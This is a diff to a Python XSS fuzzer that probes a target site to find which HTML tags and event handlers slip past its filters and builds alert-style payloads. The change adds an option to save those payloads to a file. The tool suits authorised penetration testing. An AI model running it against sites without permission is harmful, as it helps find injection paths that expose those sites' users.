@@ -33,11 +33,16 @@ def identify_allowed_event(target_url, cookie, events_file):
                 print(colored(f"[+] The '{event}' event is allowed.", "green"))
                 events.append(event)   
 
-def create_payload(tags,events):
+def create_payload(tags,events,output_file):
     for tag in tags:
         for event in events:
-            payloads.append(f"<{tag} {event}=alert(111)>")          
-     
+            payloads.append(f"<{tag} {event}=alert(111)>")       
+    
+    if output_file:
+        with open(output_file, 'w') as file:
+            for payload in payloads:
+                file.write(payload + "\n") 
+
 def parse_args():
     example = '''
     Example:
@@ -48,6 +53,7 @@ def parse_args():
     parser.add_argument('-c', '--cookie', required=True, type= str, help='The HTTP cookie header value')
     parser.add_argument('-tf', '--tags-file', required=True, help='Pass tags file')
     parser.add_argument('-ef', '--events-file', required=True, help='Pass events file')
+    parser.add_argument('-o', '--output', help='Save the results in normal file')
     args = parser.parse_args()
     return args
      
@@ -55,11 +61,11 @@ def main():
     args = parse_args()   
     identify_allowed_tag(args.url, args.cookie, args.tags_file)
     identify_allowed_event(args.url, args.cookie, args.events_file)
-    create_payload(tags, events)
+    create_payload(tags, events,args.output)
     print("----------------------------------")
     print(colored("The allowed created payloads:",'green',attrs=['bold']))
     for payload in payloads:            
-        print(colored(payload,'green',attrs=['bold']))
+        print(colored(payload,'green',attrs=['bold']))       
         
 if __name__ == '__main__':
-    main()               
+    main()
